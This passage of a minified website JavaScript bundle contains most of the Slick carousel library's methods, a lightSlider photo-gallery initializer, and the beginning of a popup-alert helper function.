|| !1 === s.options.infinite ? s.$slideTrack.children(".slick-slide").eq(e) : s.$slideTrack.children(".slick-slide").eq(e + s.options.slidesToShow + 1), t = !0 === s.options.rtl ? n[0] ? -1 * (s.$slideTrack.width() - n[0].offsetLeft - n.width()) : 0 : n[0] ? -1 * n[0].offsetLeft : 0, t += (s.$list.width() - n.outerWidth()) / 2)), t
        }, r.prototype.getOption = r.prototype.slickGetOption = function(e) {
            return this.options[e]
        }, r.prototype.getNavigableIndexes = function() {
            var e, t = this,
                i = 0,
                n = 0,
                o = [];
            for (e = !1 === t.options.infinite ? t.slideCount : (i = -1 * t.options.slidesToScroll, n = -1 * t.options.slidesToScroll, 2 * t.slideCount); i < e;) o.push(i), i = n + t.options.slidesToScroll, n += t.options.slidesToScroll <= t.options.slidesToShow ? t.options.slidesToScroll : t.options.slidesToShow;
            return o
        }, r.prototype.getSlick = function() {
            return this
        }, r.prototype.getSlideCount = function() {
            var i, n, o = this;
            return n = !0 === o.options.centerMode ? o.slideWidth * Math.floor(o.options.slidesToShow / 2) : 0, !0 === o.options.swipeToSlide ? (o.$slideTrack.find(".slick-slide").each(function(e, t) {
                if (t.offsetLeft - n + d(t).outerWidth() / 2 > -1 * o.swipeLeft) return i = t, !1
            }), Math.abs(d(i).attr("data-slick-index") - o.currentSlide) || 1) : o.options.slidesToScroll
        }, r.prototype.goTo = r.prototype.slickGoTo = function(e, t) {
            this.changeSlide({
                data: {
                    message: "index",
                    index: parseInt(e)
                }
            }, t)
        }, r.prototype.init = function(e) {
            var t = this;
            d(t.$slider).hasClass("slick-initialized") || (d(t.$slider).addClass("slick-initialized"), t.buildRows(), t.buildOut(), t.setProps(), t.startLoad(), t.loadSlider(), t.initializeEvents(), t.updateArrows(), t.updateDots(), t.checkResponsive(!0), t.focusHandler()), e && t.$slider.trigger("init", [t]), !0 === t.options.accessibility && t.initADA(), t.options.autoplay && (t.paused = !1, t.autoPlay())
        }, r.prototype.initADA = function() {
            var i = this,
                n = Math.ceil(i.slideCount / i.options.slidesToShow),
                o = i.getNavigableIndexes().filter(function(e) {
                    return 0 <= e && e < i.slideCount
                });
            i.$slides.add(i.$slideTrack.find(".slick-cloned")).attr({
                "aria-hidden": "true",
                tabindex: "-1"
            }).find("a, input, button, select").attr({
                tabindex: "-1"
            }), null !== i.$dots && (i.$slides.not(i.$slideTrack.find(".slick-cloned")).each(function(e) {
                var t = o.indexOf(e);
                d(this).attr({
                    role: "tabpanel",
                    id: "slick-slide" + i.instanceUid + e,
                    tabindex: -1
                }), -1 !== t && d(this).attr({
                    "aria-describedby": "slick-slide-control" + i.instanceUid + t
                })
            }), i.$dots.attr("role", "tablist").find("li").each(function(e) {
                var t = o[e];
                d(this).attr({
                    role: "presentation"
                }), d(this).find("button").first().attr({
                    role: "tab",
                    id: "slick-slide-control" + i.instanceUid + e,
                    "aria-controls": "slick-slide" + i.instanceUid + t,
                    "aria-label": e + 1 + " of " + n,
                    "aria-selected": null,
                    tabindex: "-1"
                })
            }).eq(i.currentSlide).find("button").attr({
                "aria-selected": "true",
                tabindex: "0"
            }).end());
            for (var e = i.currentSlide, t = e + i.options.slidesToShow; e < t; e++) i.$slides.eq(e).attr("tabindex", 0);
            i.activateADA()
        }, r.prototype.initArrowEvents = function() {
            var e = this;
            !0 === e.options.arrows && e.slideCount > e.options.slidesToShow && (e.$prevArrow.off("click.slick").on("click.slick", {
                message: "previous"
            }, e.changeSlide), e.$nextArrow.off("click.slick").on("click.slick", {
                message: "next"
            }, e.changeSlide), !0 === e.options.accessibility && (e.$prevArrow.on("keydown.slick", e.keyHandler), e.$nextArrow.on("keydown.slick", e.keyHandler)))
        }, r.prototype.initDotEvents = function() {
            var e = this;
            !0 === e.options.dots && (d("li", e.$dots).on("click.slick", {
                message: "index"
            }, e.changeSlide), !0 === e.options.accessibility && e.$dots.on("keydown.slick", e.keyHandler)), !0 === e.options.dots && !0 === e.options.pauseOnDotsHover && d("li", e.$dots).on("mouseenter.slick", d.proxy(e.interrupt, e, !0)).on("mouseleave.slick", d.proxy(e.interrupt, e, !1))
        }, r.prototype.initSlideEvents = function() {
            var e = this;
            e.options.pauseOnHover && (e.$list.on("mouseenter.slick", d.proxy(e.interrupt, e, !0)), e.$list.on("mouseleave.slick", d.proxy(e.interrupt, e, !1)))
        }, r.prototype.initializeEvents = function() {
            var e = this;
            e.initArrowEvents(), e.initDotEvents(), e.initSlideEvents(), e.$list.on("touchstart.slick mousedown.slick", {
                action: "start"
            }, e.swipeHandler), e.$list.on("touchmove.slick mousemove.slick", {
                action: "move"
            }, e.swipeHandler), e.$list.on("touchend.slick mouseup.slick", {
                action: "end"
            }, e.swipeHandler), e.$list.on("touchcancel.slick mouseleave.slick", {
                action: "end"
            }, e.swipeHandler), e.$list.on("click.slick", e.clickHandler), d(document).on(e.visibilityChange, d.proxy(e.visibility, e)), !0 === e.options.accessibility && e.$list.on("keydown.slick", e.keyHandler), !0 === e.options.focusOnSelect && d(e.$slideTrack).children().on("click.slick", e.selectHandler), d(window).on("orientationchange.slick.slick-" + e.instanceUid, d.proxy(e.orientationChange, e)), d(window).on("resize.slick.slick-" + e.instanceUid, d.proxy(e.resize, e)), d("[draggable!=true]", e.$slideTrack).on("dragstart", e.preventDefault), d(window).on("load.slick.slick-" + e.instanceUid, e.setPosition), d(e.setPosition)
        }, r.prototype.initUI = function() {
            var e = this;
            !0 === e.options.arrows && e.slideCount > e.options.slidesToShow && (e.$prevArrow.show(), e.$nextArrow.show()), !0 === e.options.dots && e.slideCount > e.options.slidesToShow && e.$dots.show()
        }, r.prototype.keyHandler = function(e) {
            var t = this;
            e.target.tagName.match("TEXTAREA|INPUT|SELECT") || (37 === e.keyCode && !0 === t.options.accessibility ? t.changeSlide({
                data: {
                    message: !0 === t.options.rtl ? "next" : "previous"
                }
            }) : 39 === e.keyCode && !0 === t.options.accessibility && t.changeSlide({
                data: {
                    message: !0 === t.options.rtl ? "previous" : "next"
                }
            }))
        }, r.prototype.lazyLoad = function() {
            function e(e) {
                d("img[data-lazy]", e).each(function() {
                    var e = d(this),
                        t = d(this).attr("data-lazy"),
                        i = d(this).attr("data-srcset"),
                        n = d(this).attr("data-sizes") || s.$slider.attr("data-sizes"),
                        o = document.createElement("img");
                    o.onload = function() {
                        e.animate({
                            opacity: 0
                        }, 100, function() {
                            i && (e.attr("srcset", i), n && e.attr("sizes", n)), e.attr("src", t).animate({
                                opacity: 1
                            }, 200, function() {
                                e.removeAttr("data-lazy data-srcset data-sizes").removeClass("slick-loading")
                            }), s.$slider.trigger("lazyLoaded", [s, e, t])
                        })
                    }, o.onerror = function() {
                        e.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"), s.$slider.trigger("lazyLoadError", [s, e, t])
                    }, o.src = t
                })
            }
            var t, i, n, s = this;
            if (!0 === s.options.centerMode ? n = !0 === s.options.infinite ? (i = s.currentSlide + (s.options.slidesToShow / 2 + 1)) + s.options.slidesToShow + 2 : (i = Math.max(0, s.currentSlide - (s.options.slidesToShow / 2 + 1)), s.options.slidesToShow / 2 + 1 + 2 + s.currentSlide) : (i = s.options.infinite ? s.options.slidesToShow + s.currentSlide : s.currentSlide, n = Math.ceil(i + s.options.slidesToShow), !0 === s.options.fade && (0 < i && i--, n <= s.slideCount && n++)), t = s.$slider.find(".slick-slide").slice(i, n), "anticipated" === s.options.lazyLoad)
                for (var o = i - 1, r = n, a = s.$slider.find(".slick-slide"), l = 0; l < s.options.slidesToScroll; l++) o < 0 && (o = s.slideCount - 1), t = (t = t.add(a.eq(o))).add(a.eq(r)), o--, r++;
            e(t), s.slideCount <= s.options.slidesToShow ? e(s.$slider.find(".slick-slide")) : s.currentSlide >= s.slideCount - s.options.slidesToShow ? e(s.$slider.find(".slick-cloned").slice(0, s.options.slidesToShow)) : 0 === s.currentSlide && e(s.$slider.find(".slick-cloned").slice(-1 * s.options.slidesToShow))
        }, r.prototype.loadSlider = function() {
            var e = this;
            e.setPosition(), e.$slideTrack.css({
                opacity: 1
            }), e.$slider.removeClass("slick-loading"), e.initUI(), "progressive" === e.options.lazyLoad && e.progressiveLazyLoad()
        }, r.prototype.next = r.prototype.slickNext = function() {
            this.changeSlide({
                data: {
                    message: "next"
                }
            })
        }, r.prototype.orientationChange = function() {
            this.checkResponsive(), this.setPosition()
        }, r.prototype.pause = r.prototype.slickPause = function() {
            this.autoPlayClear(), this.paused = !0
        }, r.prototype.play = r.prototype.slickPlay = function() {
            var e = this;
            e.autoPlay(), e.options.autoplay = !0, e.paused = !1, e.focussed = !1, e.interrupted = !1
        }, r.prototype.postSlide = function(e) {
            var t = this;
            t.unslicked || (t.$slider.trigger("afterChange", [t, e]), t.animating = !1, t.slideCount > t.options.slidesToShow && t.setPosition(), t.swipeLeft = null, t.options.autoplay && t.autoPlay(), !0 === t.options.accessibility && (t.initADA(), t.options.focusOnChange && d(t.$slides.get(t.currentSlide)).attr("tabindex", 0).focus()))
        }, r.prototype.prev = r.prototype.slickPrev = function() {
            this.changeSlide({
                data: {
                    message: "previous"
                }
            })
        }, r.prototype.preventDefault = function(e) {
            e.preventDefault()
        }, r.prototype.progressiveLazyLoad = function(e) {
            e = e || 1;
            var t, i, n, o, s, r = this,
                a = d("img[data-lazy]", r.$slider);
            a.length ? (t = a.first(), i = t.attr("data-lazy"), n = t.attr("data-srcset"), o = t.attr("data-sizes") || r.$slider.attr("data-sizes"), (s = document.createElement("img")).onload = function() {
                n && (t.attr("srcset", n), o && t.attr("sizes", o)), t.attr("src", i).removeAttr("data-lazy data-srcset data-sizes").removeClass("slick-loading"), !0 === r.options.adaptiveHeight && r.setPosition(), r.$slider.trigger("lazyLoaded", [r, t, i]), r.progressiveLazyLoad()
            }, s.onerror = function() {
                e < 3 ? setTimeout(function() {
                    r.progressiveLazyLoad(e + 1)
                }, 500) : (t.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"), r.$slider.trigger("lazyLoadError", [r, t, i]), r.progressiveLazyLoad())
            }, s.src = i) : r.$slider.trigger("allImagesLoaded", [r])
        }, r.prototype.refresh = function(e) {
            var t, i, n = this;
            i = n.slideCount - n.options.slidesToShow, !n.options.infinite && n.currentSlide > i && (n.currentSlide = i), n.slideCount <= n.options.slidesToShow && (n.currentSlide = 0), t = n.currentSlide, n.destroy(!0), d.extend(n, n.initials, {
                currentSlide: t
            }), n.init(), e || n.changeSlide({
                data: {
                    message: "index",
                    index: t
                }
            }, !1)
        }, r.prototype.registerBreakpoints = function() {
            var e, t, i, n = this,
                o = n.options.responsive || null;
            if ("array" === d.type(o) && o.length) {
                for (e in n.respondTo = n.options.respondTo || "window", o)
                    if (i = n.breakpoints.length - 1, o.hasOwnProperty(e)) {
                        for (t = o[e].breakpoint; 0 <= i;) n.breakpoints[i] && n.breakpoints[i] === t && n.breakpoints.splice(i, 1), i--;
                        n.breakpoints.push(t), n.breakpointSettings[t] = o[e].settings
                    }
                n.breakpoints.sort(function(e, t) {
                    return n.options.mobileFirst ? e - t : t - e
                })
            }
        }, r.prototype.reinit = function() {
            var e = this;
            e.$slides = e.$slideTrack.children(e.options.slide).addClass("slick-slide"), e.slideCount = e.$slides.length, e.currentSlide >= e.slideCount && 0 !== e.currentSlide && (e.currentSlide = e.currentSlide - e.options.slidesToScroll), e.slideCount <= e.options.slidesToShow && (e.currentSlide = 0), e.registerBreakpoints(), e.setProps(), e.setupInfinite(), e.buildArrows(), e.updateArrows(), e.initArrowEvents(), e.buildDots(), e.updateDots(), e.initDotEvents(), e.cleanUpSlideEvents(), e.initSlideEvents(), e.checkResponsive(!1, !0), !0 === e.options.focusOnSelect && d(e.$slideTrack).children().on("click.slick", e.selectHandler), e.setSlideClasses("number" == typeof e.currentSlide ? e.currentSlide : 0), e.setPosition(), e.focusHandler(), e.paused = !e.options.autoplay, e.autoPlay(), e.$slider.trigger("reInit", [e])
        }, r.prototype.resize = function() {
            var e = this;
            d(window).width() !== e.windowWidth && (clearTimeout(e.windowDelay), e.windowDelay = window.setTimeout(function() {
                e.windowWidth = d(window).width(), e.checkResponsive(), e.unslicked || e.setPosition()
            }, 50))
        }, r.prototype.removeSlide = r.prototype.slickRemove = function(e, t, i) {
            var n = this;
            if (e = "boolean" == typeof e ? !0 === (t = e) ? 0 : n.slideCount - 1 : !0 === t ? --e : e, n.slideCount < 1 || e < 0 || e > n.slideCount - 1) return !1;
            n.unload(), !0 === i ? n.$slideTrack.children().remove() : n.$slideTrack.children(this.options.slide).eq(e).remove(), n.$slides = n.$slideTrack.children(this.options.slide), n.$slideTrack.children(this.options.slide).detach(), n.$slideTrack.append(n.$slides), n.$slidesCache = n.$slides, n.reinit()
        }, r.prototype.setCSS = function(e) {
            var t, i, n = this,
                o = {};
            !0 === n.options.rtl && (e = -e), t = "left" == n.positionProp ? Math.ceil(e) + "px" : "0px", i = "top" == n.positionProp ? Math.ceil(e) + "px" : "0px", o[n.positionProp] = e, !1 === n.transformsEnabled || (!(o = {}) === n.cssTransitions ? o[n.animType] = "translate(" + t + ", " + i + ")" : o[n.animType] = "translate3d(" + t + ", " + i + ", 0px)"), n.$slideTrack.css(o)
        }, r.prototype.setDimensions = function() {
            var e = this;
            !1 === e.options.vertical ? !0 === e.options.centerMode && e.$list.css({
                padding: "0px " + e.options.centerPadding
            }) : (e.$list.height(e.$slides.first().outerHeight(!0) * e.options.slidesToShow), !0 === e.options.centerMode && e.$list.css({
                padding: e.options.centerPadding + " 0px"
            })), e.listWidth = e.$list.width(), e.listHeight = e.$list.height(), !1 === e.options.vertical && !1 === e.options.variableWidth ? (e.slideWidth = Math.ceil(e.listWidth / e.options.slidesToShow), e.$slideTrack.width(Math.ceil(e.slideWidth * e.$slideTrack.children(".slick-slide").length))) : !0 === e.options.variableWidth ? e.$slideTrack.width(5e3 * e.slideCount) : (e.slideWidth = Math.ceil(e.listWidth), e.$slideTrack.height(Math.ceil(e.$slides.first().outerHeight(!0) * e.$slideTrack.children(".slick-slide").length)));
            var t = e.$slides.first().outerWidth(!0) - e.$slides.first().width();
            !1 === e.options.variableWidth && e.$slideTrack.children(".slick-slide").width(e.slideWidth - t)
        }, r.prototype.setFade = function() {
            var i, n = this;
            n.$slides.each(function(e, t) {
                i = n.slideWidth * e * -1, !0 === n.options.rtl ? d(t).css({
                    position: "relative",
                    right: i,
                    top: 0,
                    zIndex: n.options.zIndex - 2,
                    opacity: 0
                }) : d(t).css({
                    position: "relative",
                    left: i,
                    top: 0,
                    zIndex: n.options.zIndex - 2,
                    opacity: 0
                })
            }), n.$slides.eq(n.currentSlide).css({
                zIndex: n.options.zIndex - 1,
                opacity: 1
            })
        }, r.prototype.setHeight = function() {
            var e = this;
            if (1 === e.options.slidesToShow && !0 === e.options.adaptiveHeight && !1 === e.options.vertical) {
                var t = e.$slides.eq(e.currentSlide).outerHeight(!0);
                e.$list.css("height", t)
            }
        }, r.prototype.setOption = r.prototype.slickSetOption = function() {
            var e, t, i, n, o, s = this,
                r = !1;
            if ("object" === d.type(arguments[0]) ? (i = arguments[0], r = arguments[1], o = "multiple") : "string" === d.type(arguments[0]) && (i = arguments[0], n = arguments[1], r = arguments[2], "responsive" === arguments[0] && "array" === d.type(arguments[1]) ? o = "responsive" : void 0 !== arguments[1] && (o = "single")), "single" === o) s.options[i] = n;
            else if ("multiple" === o) d.each(i, function(e, t) {
                s.options[e] = t
            });
            else if ("responsive" === o)
                for (t in n)
                    if ("array" !== d.type(s.options.responsive)) s.options.responsive = [n[t]];
                    else {
                        for (e = s.options.responsive.length - 1; 0 <= e;) s.options.responsive[e].breakpoint === n[t].breakpoint && s.options.responsive.splice(e, 1), e--;
                        s.options.responsive.push(n[t])
                    }
            r && (s.unload(), s.reinit())
        }, r.prototype.setPosition = function() {
            var e = this;
            e.setDimensions(), e.setHeight(), !1 === e.options.fade ? e.setCSS(e.getLeft(e.currentSlide)) : e.setFade(), e.$slider.trigger("setPosition", [e])
        }, r.prototype.setProps = function() {
            var e = this,
                t = document.body.style;
            e.positionProp = !0 === e.options.vertical ? "top" : "left", "top" === e.positionProp ? e.$slider.addClass("slick-vertical") : e.$slider.removeClass("slick-vertical"), void 0 === t.WebkitTransition && void 0 === t.MozTransition && void 0 === t.msTransition || !0 === e.options.useCSS && (e.cssTransitions = !0), e.options.fade && ("number" == typeof e.options.zIndex ? e.options.zIndex < 3 && (e.options.zIndex = 3) : e.options.zIndex = e.defaults.zIndex), void 0 !== t.OTransform && (e.animType = "OTransform", e.transformType = "-o-transform", e.transitionType = "OTransition", void 0 === t.perspectiveProperty && void 0 === t.webkitPerspective && (e.animType = !1)), void 0 !== t.MozTransform && (e.animType = "MozTransform", e.transformType = "-moz-transform", e.transitionType = "MozTransition", void 0 === t.perspectiveProperty && void 0 === t.MozPerspective && (e.animType = !1)), void 0 !== t.webkitTransform && (e.animType = "webkitTransform", e.transformType = "-webkit-transform", e.transitionType = "webkitTransition", void 0 === t.perspectiveProperty && void 0 === t.webkitPerspective && (e.animType = !1)), void 0 !== t.msTransform && (e.animType = "msTransform", e.transformType = "-ms-transform", e.transitionType = "msTransition", void 0 === t.msTransform && (e.animType = !1)), void 0 !== t.transform && !1 !== e.animType && (e.animType = "transform", e.transformType = "transform", e.transitionType = "transition"), e.transformsEnabled = e.options.useTransform && null !== e.animType && !1 !== e.animType
        }, r.prototype.setSlideClasses = function(e) {
            var t, i, n, o, s = this;
            if (i = s.$slider.find(".slick-slide").removeClass("slick-active slick-center slick-current").attr("aria-hidden", "true"), s.$slides.eq(e).addClass("slick-current"), !0 === s.options.centerMode) {
                var r = s.options.slidesToShow % 2 == 0 ? 1 : 0;
                t = Math.floor(s.options.slidesToShow / 2), !0 === s.options.infinite && (t <= e && e <= s.slideCount - 1 - t ? s.$slides.slice(e - t + r, e + t + 1).addClass("slick-active").attr("aria-hidden", "false") : (n = s.options.slidesToShow + e, i.slice(n - t + 1 + r, n + t + 2).addClass("slick-active").attr("aria-hidden", "false")), 0 === e ? i.eq(i.length - 1 - s.options.slidesToShow).addClass("slick-center") : e === s.slideCount - 1 && i.eq(s.options.slidesToShow).addClass("slick-center")), s.$slides.eq(e).addClass("slick-center")
            } else 0 <= e && e <= s.slideCount - s.options.slidesToShow ? s.$slides.slice(e, e + s.options.slidesToShow).addClass("slick-active").attr("aria-hidden", "false") : i.length <= s.options.slidesToShow ? i.addClass("slick-active").attr("aria-hidden", "false") : (o = s.slideCount % s.options.slidesToShow, n = !0 === s.options.infinite ? s.options.slidesToShow + e : e, s.options.slidesToShow == s.options.slidesToScroll && s.slideCount - e < s.options.slidesToShow ? i.slice(n - (s.options.slidesToShow - o), n + o).addClass("slick-active").attr("aria-hidden", "false") : i.slice(n, n + s.options.slidesToShow).addClass("slick-active").attr("aria-hidden", "false"));
            "ondemand" !== s.options.lazyLoad && "anticipated" !== s.options.lazyLoad || s.lazyLoad()
        }, r.prototype.setupInfinite = function() {
            var e, t, i, n = this;
            if (!0 === n.options.fade && (n.options.centerMode = !1), !0 === n.options.infinite && !1 === n.options.fade && (t = null, n.slideCount > n.options.slidesToShow)) {
                for (i = !0 === n.options.centerMode ? n.options.slidesToShow + 1 : n.options.slidesToShow, e = n.slideCount; e > n.slideCount - i; e -= 1) t = e - 1, d(n.$slides[t]).clone(!0).attr("id", "").attr("data-slick-index", t - n.slideCount).prependTo(n.$slideTrack).addClass("slick-cloned");
                for (e = 0; e < i + n.slideCount; e += 1) t = e, d(n.$slides[t]).clone(!0).attr("id", "").attr("data-slick-index", t + n.slideCount).appendTo(n.$slideTrack).addClass("slick-cloned");
                n.$slideTrack.find(".slick-cloned").find("[id]").each(function() {
                    d(this).attr("id", "")
                })
            }
        }, r.prototype.interrupt = function(e) {
            e || this.autoPlay(), this.interrupted = e
        }, r.prototype.selectHandler = function(e) {
            var t = d(e.target).is(".slick-slide") ? d(e.target) : d(e.target).parents(".slick-slide"),
                i = parseInt(t.attr("data-slick-index"));
            i || (i = 0), this.slideCount <= this.options.slidesToShow ? this.slideHandler(i, !1, !0) : this.slideHandler(i)
        }, r.prototype.slideHandler = function(e, t, i) {
            var n, o, s, r, a, l = null,
                d = this;
            if (t = t || !1, !(!0 === d.animating && !0 === d.options.waitForAnimate || !0 === d.options.fade && d.currentSlide === e))
                if (!1 === t && d.asNavFor(e), n = e, l = d.getLeft(n), r = d.getLeft(d.currentSlide), d.currentLeft = null === d.swipeLeft ? r : d.swipeLeft, !1 === d.options.infinite && !1 === d.options.centerMode && (e < 0 || e > d.getDotCount() * d.options.slidesToScroll)) !1 === d.options.fade && (n = d.currentSlide, !0 !== i ? d.animateSlide(r, function() {
                    d.postSlide(n)
                }) : d.postSlide(n));
                else if (!1 === d.options.infinite && !0 === d.options.centerMode && (e < 0 || e > d.slideCount - d.options.slidesToScroll)) !1 === d.options.fade && (n = d.currentSlide, !0 !== i ? d.animateSlide(r, function() {
                d.postSlide(n)
            }) : d.postSlide(n));
            else {
                if (d.options.autoplay && clearInterval(d.autoPlayTimer), o = n < 0 ? d.slideCount % d.options.slidesToScroll != 0 ? d.slideCount - d.slideCount % d.options.slidesToScroll : d.slideCount + n : n >= d.slideCount ? d.slideCount % d.options.slidesToScroll != 0 ? 0 : n - d.slideCount : n, d.animating = !0, d.$slider.trigger("beforeChange", [d, d.currentSlide, o]), s = d.currentSlide, d.currentSlide = o, d.setSlideClasses(d.currentSlide), d.options.asNavFor && (a = (a = d.getNavTarget()).slick("getSlick")).slideCount <= a.options.slidesToShow && a.setSlideClasses(d.currentSlide), d.updateDots(), d.updateArrows(), !0 === d.options.fade) return !0 !== i ? (d.fadeSlideOut(s), d.fadeSlide(o, function() {
                    d.postSlide(o)
                })) : d.postSlide(o), void d.animateHeight();
                !0 !== i ? d.animateSlide(l, function() {
                    d.postSlide(o)
                }) : d.postSlide(o)
            }
        }, r.prototype.startLoad = function() {
            var e = this;
            !0 === e.options.arrows && e.slideCount > e.options.slidesToShow && (e.$prevArrow.hide(), e.$nextArrow.hide()), !0 === e.options.dots && e.slideCount > e.options.slidesToShow && e.$dots.hide(), e.$slider.addClass("slick-loading")
        }, r.prototype.swipeDirection = function() {
            var e, t, i, n, o = this;
            return e = o.touchObject.startX - o.touchObject.curX, t = o.touchObject.startY - o.touchObject.curY, i = Math.atan2(t, e), (n = Math.round(180 * i / Math.PI)) < 0 && (n = 360 - Math.abs(n)), n <= 45 && 0 <= n ? !1 === o.options.rtl ? "left" : "right" : n <= 360 && 315 <= n ? !1 === o.options.rtl ? "left" : "right" : 135 <= n && n <= 225 ? !1 === o.options.rtl ? "right" : "left" : !0 === o.options.verticalSwiping ? 35 <= n && n <= 135 ? "down" : "up" : "vertical"
        }, r.prototype.swipeEnd = function(e) {
            var t, i, n = this;
            if (n.dragging = !1, n.swiping = !1, n.scrolling) return n.scrolling = !1;
            if (n.interrupted = !1, n.shouldClick = !(10 < n.touchObject.swipeLength), void 0 === n.touchObject.curX) return !1;
            if (!0 === n.touchObject.edgeHit && n.$slider.trigger("edge", [n, n.swipeDirection()]), n.touchObject.swipeLength >= n.touchObject.minSwipe) {
                switch (i = n.swipeDirection()) {
                    case "left":
                    case "down":
                        t = n.options.swipeToSlide ? n.checkNavigable(n.currentSlide + n.getSlideCount()) : n.currentSlide + n.getSlideCount(), n.currentDirection = 0;
                        break;
                    case "right":
                    case "up":
                        t = n.options.swipeToSlide ? n.checkNavigable(n.currentSlide - n.getSlideCount()) : n.currentSlide - n.getSlideCount(), n.currentDirection = 1
                }
                "vertical" != i && (n.slideHandler(t), n.touchObject = {}, n.$slider.trigger("swipe", [n, i]))
            } else n.touchObject.startX !== n.touchObject.curX && (n.slideHandler(n.currentSlide), n.touchObject = {})
        }, r.prototype.swipeHandler = function(e) {
            var t = this;
            if (!(!1 === t.options.swipe || "ontouchend" in document && !1 === t.options.swipe || !1 === t.options.draggable && -1 !== e.type.indexOf("mouse"))) switch (t.touchObject.fingerCount = e.originalEvent && void 0 !== e.originalEvent.touches ? e.originalEvent.touches.length : 1, t.touchObject.minSwipe = t.listWidth / t.options.touchThreshold, !0 === t.options.verticalSwiping && (t.touchObject.minSwipe = t.listHeight / t.options.touchThreshold), e.data.action) {
                case "start":
                    t.swipeStart(e);
                    break;
                case "move":
                    t.swipeMove(e);
                    break;
                case "end":
                    t.swipeEnd(e)
            }
        }, r.prototype.swipeMove = function(e) {
            var t, i, n, o, s, r, a = this;
            return s = void 0 !== e.originalEvent ? e.originalEvent.touches : null, !(!a.dragging || a.scrolling || s && 1 !== s.length) && (t = a.getLeft(a.currentSlide), a.touchObject.curX = void 0 !== s ? s[0].pageX : e.clientX, a.touchObject.curY = void 0 !== s ? s[0].pageY : e.clientY, a.touchObject.swipeLength = Math.round(Math.sqrt(Math.pow(a.touchObject.curX - a.touchObject.startX, 2))), r = Math.round(Math.sqrt(Math.pow(a.touchObject.curY - a.touchObject.startY, 2))), !a.options.verticalSwiping && !a.swiping && 4 < r ? !(a.scrolling = !0) : (!0 === a.options.verticalSwiping && (a.touchObject.swipeLength = r), i = a.swipeDirection(), void 0 !== e.originalEvent && 4 < a.touchObject.swipeLength && (a.swiping = !0, e.preventDefault()), o = (!1 === a.options.rtl ? 1 : -1) * (a.touchObject.curX > a.touchObject.startX ? 1 : -1), !0 === a.options.verticalSwiping && (o = a.touchObject.curY > a.touchObject.startY ? 1 : -1), n = a.touchObject.swipeLength, (a.touchObject.edgeHit = !1) === a.options.infinite && (0 === a.currentSlide && "right" === i || a.currentSlide >= a.getDotCount() && "left" === i) && (n = a.touchObject.swipeLength * a.options.edgeFriction, a.touchObject.edgeHit = !0), !1 === a.options.vertical ? a.swipeLeft = t + n * o : a.swipeLeft = t + n * (a.$list.height() / a.listWidth) * o, !0 === a.options.verticalSwiping && (a.swipeLeft = t + n * o), !0 !== a.options.fade && !1 !== a.options.touchMove && (!0 === a.animating ? (a.swipeLeft = null, !1) : void a.setCSS(a.swipeLeft))))
        }, r.prototype.swipeStart = function(e) {
            var t, i = this;
            if (i.interrupted = !0, 1 !== i.touchObject.fingerCount || i.slideCount <= i.options.slidesToShow) return !(i.touchObject = {});
            void 0 !== e.originalEvent && void 0 !== e.originalEvent.touches && (t = e.originalEvent.touches[0]), i.touchObject.startX = i.touchObject.curX = void 0 !== t ? t.pageX : e.clientX, i.touchObject.startY = i.touchObject.curY = void 0 !== t ? t.pageY : e.clientY, i.dragging = !0
        }, r.prototype.unfilterSlides = r.prototype.slickUnfilter = function() {
            var e = this;
            null !== e.$slidesCache && (e.unload(), e.$slideTrack.children(this.options.slide).detach(), e.$slidesCache.appendTo(e.$slideTrack), e.reinit())
        }, r.prototype.unload = function() {
            var e = this;
            d(".slick-cloned", e.$slider).remove(), e.$dots && e.$dots.remove(), e.$prevArrow && e.htmlExpr.test(e.options.prevArrow) && e.$prevArrow.remove(), e.$nextArrow && e.htmlExpr.test(e.options.nextArrow) && e.$nextArrow.remove(), e.$slides.removeClass("slick-slide slick-active slick-visible slick-current").attr("aria-hidden", "true").css("width", "")
        }, r.prototype.unslick = function(e) {
            this.$slider.trigger("unslick", [this, e]), this.destroy()
        }, r.prototype.updateArrows = function() {
            var e = this;
            Math.floor(e.options.slidesToShow / 2), !0 === e.options.arrows && e.slideCount > e.options.slidesToShow && !e.options.infinite && (e.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false"), e.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false"), 0 === e.currentSlide ? (e.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true"), e.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false")) : e.currentSlide >= e.slideCount - e.options.slidesToShow && !1 === e.options.centerMode ? (e.$nextArrow.addClass("slick-disabled").attr("aria-disabled", "true"), e.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false")) : e.currentSlide >= e.slideCount - 1 && !0 === e.options.centerMode && (e.$nextArrow.addClass("slick-disabled").attr("aria-disabled", "true"), e.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false")))
        }, r.prototype.updateDots = function() {
            var e = this;
            null !== e.$dots && (e.$dots.find("li").removeClass("slick-active").end(), e.$dots.find("li").eq(Math.floor(e.currentSlide / e.options.slidesToScroll)).addClass("slick-active"))
        }, r.prototype.visibility = function() {
            this.options.autoplay && (document[this.hidden] ? this.interrupted = !0 : this.interrupted = !1)
        }, d.fn.slick = function() {
            var e, t, i = this,
                n = arguments[0],
                o = Array.prototype.slice.call(arguments, 1),
                s = i.length;
            for (e = 0; e < s; e++)
                if ("object" == (void 0 === n ? "undefined" : a(n)) || void 0 === n ? i[e].slick = new r(i[e], n) : t = i[e].slick[n].apply(i[e].slick, o), void 0 !== t) return t;
            return i
        }
    }) ? n.apply(t, o) : n) || (e.exports = s)
}, function(e, t, i) {
    "use strict";
    $(function() {
        $(".photo-slider li").length && ($(".photo-slider li:last").after($(".photo-slider li:last")[0].outerHTML), $(".photo-slider").lightSlider({
            gallery: !0,
            item: 1,
            loop: !1,
            thumbItem: 6,
            thumbMargin: 20,
            enableDrag: !0,
            currentPagerPosition: "left"
        }), $(".lSGallery").wrap('<div class="lSGallery_wrap"></div>'))
    })
}]);
/* End */
;
; /* Start:"a:4:{s:4:"full";s:64:"/local/components/feedback.ajax/js/popup-alert.js?16572811601469";s:6:"source";s:49:"/local/components/feedback.ajax/js/popup-alert.js";s:3:"min";s:0:"";s:3:"map";s:0:"";}"*/
function getMessage( msg, type, delay, callback ){
	switch(type){
		case 'error':
			cssClass = 'red-popup-thor';
		break;
		case 'accept':
			cssClass = 'popup-thor';
		break;
		case 'message':
		default:
			cssClass = 'green-popup-thor';
	}

    if( delay == undefined && !isNaN( parseInt( delay ) ) ){
        delay = 3000;
    } else {
